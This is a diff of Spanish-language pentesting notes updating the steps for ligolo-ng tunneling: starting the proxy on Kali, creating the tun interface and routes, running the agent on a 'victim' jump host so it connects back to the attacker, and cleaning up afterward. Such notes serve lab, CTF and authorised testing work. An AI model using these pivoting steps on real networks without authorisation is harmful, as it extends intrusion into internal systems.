@@ -57,35 +57,34 @@ del proceso:
 # Descargar agente y proxy 
 NOTA: Cada vez que se quiera llegar a una red, se tiene que crear una nueva interfaz de red
 
-
-PASO 1:
-❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
-❯ ip link set ligolo up 
-❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
-	# dev = Dispositivo llamado 'ligolo'
+PASO 1: 
+❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
+❯ interface_create --name ligolo              # Crear la interfaz
+❯ interface_add_route --name ligolo --route IP.0/24     # Agregar el segmento al cual se quiere llegar 
 
 
 PASO 2: 
-❯ ./proxy -selfcert           # Ejecutar el proxy en Kali con permisos de ejecución
-
-
-PASO 3: 
 ❯ chmod +x agent   # Permisos de ejecución 
 ❯ ./agent -connect IP_Kali:11601 -ignore-cert       # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
 	# IP = Direción IP de Kali
 	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 
 
 
-PASO 4:
+PASO 3:
 # Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
 ❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
-❯ start           # Iniciar el tunelizado al segmento de red 
-
+❯ tunnel_start --tun ligolo   # Iniciar el tunelizado al segmento de red     
 ```
 
 ```bash 
-PASO EXTRA: 
+# Interfaz modo manual 
+PASO 1:
+❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
+❯ ip link set ligolo up 
+❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
+	# dev = Dispositivo llamado 'ligolo'
 
+PASO 2: 
 # Al terminar eliminar las rutas y la interfaz 'ligolo' en Kali 
 ❯ ip route del IP.0/24 dev ligolo    # Eliminar la ruta de la tabla de ruteo 
 ❯ ip link del ligolo                 # Eliminar la interface llamada 'ligolo'
